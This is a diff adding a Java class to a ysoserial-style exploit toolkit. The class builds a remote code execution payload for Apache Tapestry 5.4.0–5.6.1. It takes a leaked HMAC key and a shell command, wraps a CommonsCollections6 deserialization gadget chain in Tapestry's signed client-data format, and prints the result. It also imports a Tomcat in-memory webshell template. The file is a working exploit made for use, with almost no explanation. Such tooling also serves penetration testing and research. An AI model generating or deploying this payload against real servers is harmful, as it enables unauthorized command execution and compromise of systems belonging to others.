@@ -1,0 +1,61 @@
+package ysoserial.payloads;
+
+/**
+ * @Author:novy
+ * @Date:10:40 2022/4/23
+ * @Version 1.0
+ * 参数输入格式：密钥 命令
+ **/
+import org.apache.tapestry5.internal.services.ClientDataEncoderImpl;
+import org.apache.tapestry5.internal.services.URLEncoderImpl;
+import org.apache.tapestry5.services.ClientDataEncoder;
+import org.apache.tapestry5.services.ClientDataSink;
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.templates.TomcatFilterMemShellFromJMX;
+import ysoserial.payloads.util.PayloadRunner;
+
+import java.io.ObjectOutputStream;
+
+@SuppressWarnings({"rawtypes", "unchecked"})
+@Dependencies({"org:tapestry:5.4.0 to 5.6.1 cc6,please add hmac key and command,eg:12345 calc"})
+public class TapestryrcePOC extends PayloadRunner implements ObjectPayload<Object> {
+    public static void main(final String[] args) throws Exception {
+        String s = (String) new TapestryrcePOC().getObject(CommonsCollections6.class.getName(), args); //这里根据情况改利用链
+        System.out.println("payload:"+s);
+    }
+    public String getObject(String gadgetsName, boolean needBase64, String... args) throws Exception {
+        String key, command = null;
+        if (args.length == 0) {
+            System.out.println("please add hmac key and command,eg:12345 calc");
+        }
+        if (args.length < 1) {
+            System.out.println("please add hmac key");
+        }
+        if (args.length < 2) {
+            System.out.println("please add command");
+        }else{
+            command = args[1];
+        }
+        //密钥
+        key = args[0];
+        Class clazz = Class.forName(gadgetsName);
+        ObjectPayload gadgets = (ObjectPayload) clazz.newInstance();
+        Object obj = gadgets.getObject(command);
+        URLEncoderImpl urlEncoder = new URLEncoderImpl();
+        ClientDataEncoder cde = new ClientDataEncoderImpl(urlEncoder, key, null, null, null);
+        ClientDataSink cds = cde.createSink();
+        ObjectOutputStream oos = cds.getObjectOutputStream();
+        oos.writeUTF("wecat_iH");
+        oos.writeBoolean(false);
+        oos.writeObject(obj);
+        return cds.getClientData();
+    }
+    @Override
+    public Object getObject(String command) throws Exception {
+        return getObject(command, null);
+    }
+    public Object getObject(String gadgetName, String... args) throws Exception {
+        return getObject(gadgetName, true, args);
+    }
+}
